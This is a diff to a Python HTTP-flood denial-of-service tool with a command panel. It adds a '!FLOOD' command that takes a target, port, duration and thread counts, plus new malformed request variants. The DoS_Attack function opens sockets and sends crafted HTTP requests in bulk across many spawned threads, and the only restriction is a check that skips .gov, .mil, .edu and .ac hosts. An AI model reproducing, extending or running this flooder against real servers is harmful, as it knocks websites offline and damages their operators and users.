@@ -21,8 +21,6 @@ def clear_text():
     else:
         os.system('clear')
 
-def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -36,8 +34,7 @@ def generate_url_path_choice(num):
     return data
 
 # DOS
-def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
-    rps = 0
+def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
     url_path = ''
     path_get = ['PY_FLOOD','CHOICES_FLOOD']
     path_get_loader = random.choice((path_get))
@@ -59,79 +56,111 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
         elif data_type_loader_packet == 'OWN5':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
+        elif data_type_loader_packet == 'OWN6':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
+        elif data_type_loader_packet == 'OWN7':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
         s.connect((ip,port))
         for _ in range(booter_sent):
             s.sendall(packet_data)
             s.send(packet_data)
-            rps += 2
     except:
         try:
             s.shutdown(socket.SHUT_RDWR)
             s.close()
         except:
             pass
-    status_print(ip,port,id,rps,path_get_loader)
 
 status_code = False
-id_loader = 0
 def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
-    global status_code,id_loader
+    global status_code
     if status_code == True:
         while time.time() < time_loader:
             for _ in range(spam_loader):
-                id_loader += 1
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
     else:
         threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
+prefix_get = "!"
+status_help_type = 0
+def command():
+    global status_help_type,status_code,prefix_get
+    if status_help_type == 0:
+        print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘\n {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}< {Fore.LIGHTGREEN_EX}TYPE {prefix_get}HELP FOR SHOW COMMAND {Fore.WHITE}> {Fore.RESET}")
+        status_help_type += 1
+    else:
+        pass
 
-#DATA
-banner = f"""
-{Fore.YELLOW}     __..---..__
-{Fore.YELLOW} ,-='  {Fore.RED}/  |  \  {Fore.YELLOW}`=-.
-{Fore.WHITE}:--..___________..--;
-{Fore.WHITE} \.,_____________,./
- 
-{Fore.RED}╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐
-{Fore.LIGHTRED_EX}╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ 
-{Fore.WHITE}╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘  {Fore.YELLOW}# (OFFLINE) {Fore.LIGHTYELLOW_EX}TOOL v2 #{Fore.RESET}"""
-
-print(banner)
-host = ""
-ip = ""
-print(f"{Fore.LIGHTWHITE_EX}PYF OWN1-5")
-data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET (DEFAULT=PYF EXAMPLE=OWN1)>").upper()
-target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
-port_loader = int(input(f"{Fore.YELLOW}PORT>"))
-time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=250)>"))
-spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 EXAMPLE=299)>"))
-create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)>"))
-booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500 EXAMPLE=65536)>"))
-print(f"{Fore.LIGHTCYAN_EX}       EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
-print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
-methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>").upper()
-spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}SPAM CREATE THREAD (DEFAULT=5 EXAMPLE=15)>"))
-print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
-try:
-    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
-    ip = socket.gethostbyname(host)
-except socket.gaierror:
-    exit()
-for loader_num in range(create_thread):
-    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
-    sys.stdout.flush()
-    
-    for _ in range(spam_create_thread):
-        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
+    data_input_loader = input(f"{Fore.CYAN}ROOT{Fore.WHITE}@{Fore.BLUE}SOCKET.PIE {Fore.WHITE}${Fore.RESET}")
+    args_get = data_input_loader.split(" ")
+    if args_get[0].upper() == f"{prefix_get}CREDIT":
+        print(f"{Fore.YELLOW}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.LIGHTYELLOW_EX}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗{Fore.RED}┌─┐┬┌─┐\n{Fore.YELLOW}   ╚═╗║ ║║  ╠╩╗║╣  ║{Fore.LIGHTRED_EX} ├─┘│├┤ \n{Fore.LIGHTRED_EX}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩{Fore.WHITE}o{Fore.LIGHTYELLOW_EX}┴  ┴└─┘\n\n{Fore.LIGHTMAGENTA_EX}CREDIT {Fore.WHITE}- {Fore.LIGHTBLUE_EX}ART {Fore.WHITE}: {Fore.CYAN}Riitta Rasimus {Fore.WHITE}- {Fore.LIGHTCYAN_EX}ascii.co.uk/art/pie {Fore.WHITE}|{Fore.GREEN} DEV {Fore.WHITE}- {Fore.LIGHTGREEN_EX}github.com/Hex1629{Fore.RESET}")
+    elif args_get[0].upper() == f"{prefix_get}HELP":
+        print(f"{Fore.GREEN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━┓\n┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━┫\n{Fore.LIGHTGREEN_EX}┃ HELP COMMAND . menu                                ┃\n{Fore.GREEN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n   {Fore.RED}{prefix_get}HELP         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For show command\n   {Fore.RED}{prefix_get}CREDIT       {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For show credit\n   {Fore.RED}{prefix_get}CLS          {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For clear all screen\n   {Fore.RED}{prefix_get}MENU         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For return to menu\n   {Fore.RED}{prefix_get}PREFIX_SET   {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For set prefix\n   {Fore.RED}{prefix_get}FLOOD        {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For attack target with http flood\n   {Fore.RED}{prefix_get}EXIT         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For exit from panel\n{Fore.GREEN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{Fore.RESET}")
+    elif args_get[0].upper() == f"{prefix_get}PREFIX_SET":
+        if len(args_get) == 2:
+            prefix_get = args_get[1]
+        else:
+            print(f"{Fore.YELLOW}{prefix_get}PREFIX_SET <PREFIX>{Fore.RESET}")
+    elif args_get[0].upper() == f"{prefix_get}CLEAR" or args_get[0].upper() == f"{prefix_get}CLS":
+        clear_text()
+    elif args_get[0].upper() == f"{prefix_get}MENU":
+        clear_text()
+        print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘\n {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}< {Fore.LIGHTGREEN_EX}TYPE {prefix_get}HELP FOR SHOW COMMAND {Fore.WHITE}> {Fore.RESET}")
+    elif args_get[0].upper() == f"{prefix_get}EXIT":
+        print(f"{Fore.LIGHTGREEN_EX}EXIT . . .{Fore.RESET}")
+        exit()
+    elif args_get[0].upper() == f"{prefix_get}FLOOD":
+        if len(args_get) == 10:
+            data_type_loader_packet = args_get[1].upper()
+            target_loader = args_get[2]
+            port_loader = int(args_get[3])
+            time_loader = time.time() + int(args_get[4])
+            spam_loader = int(args_get[5])
+            create_thread = int(args_get[6])
+            booter_sent = int(args_get[7])
+            methods_loader = args_get[8]
+            spam_create_thread = int(args_get[9])
+            code_leak = True
+            host = ''
+            ip = ''
+            try:
+                host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
+                if '.gov' in host or '.mil' in host or '.edu' in host or '.ac' in host:
+                    code_leak = False
+                    print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
+                else:
+                    ip = socket.gethostbyname(host)
+                    code_leak = True
+            except socket.gaierror:
+                code_leak = False
+                print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
+            if code_leak == True:
+             for loader_num in range(create_thread):
+                sys.stdout.write(f"\r {Fore.YELLOW}{loader_num}% CREATE THREAD . . .{Fore.RESET}")
+                sys.stdout.flush()
+                for _ in range(spam_create_thread):
+                  threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
+             clear_text()
+             status_code = True
+             print(f"{Fore.LIGHTCYAN_EX}Sending Packet {Fore.CYAN}HTTP FLOOD {Fore.LIGHTCYAN_EX}To Target {Fore.WHITE}!\n\n{Fore.YELLOW}    ━╦━━━━━━━━━━━━━━━━━━━━━╦━\n{Fore.LIGHTYELLOW_EX}╚═══╦╩═════════════════════╩╦═══╝\n{Fore.WHITE}       ━ ━ ━ {Fore.LIGHTGREEN_EX}SENDING {Fore.WHITE}━ ━ ━  \n{Fore.LIGHTRED_EX}  ╔═╩═══════════════════════╩═╗\n     {Fore.GREEN}Target: {target_loader}\n       {Fore.GREEN}Port: {port_loader}\n       {Fore.GREEN}Type: {data_type_loader_packet}\n{Fore.RED}  ╚═══════════════════════════╝\n      {Fore.BLUE}@DEV {Fore.WHITE}- {Fore.LIGHTBLUE_EX}Hex1629{Fore.RESET}")
+        else:
+            print(f"{Fore.RED}{prefix_get}FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
+            print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
+    else:
+        print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
+    command()
+print(F"{Fore.BLUE}LOGIN TO PANEL {Fore.WHITE}({Fore.LIGHTBLUE_EX}AUTO LOGIN WITH ROOT@SOCKET.PIE{Fore.WHITE}) . . .{Fore.RESET}")
+time.sleep(int(random.randint(1,3)))
+print(f"{Fore.CYAN}PANEL LOADING . . .{Fore.RESET}")
+time.sleep(1)
 clear_text()
-print(banner)
-status_code = True
-print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
+command()
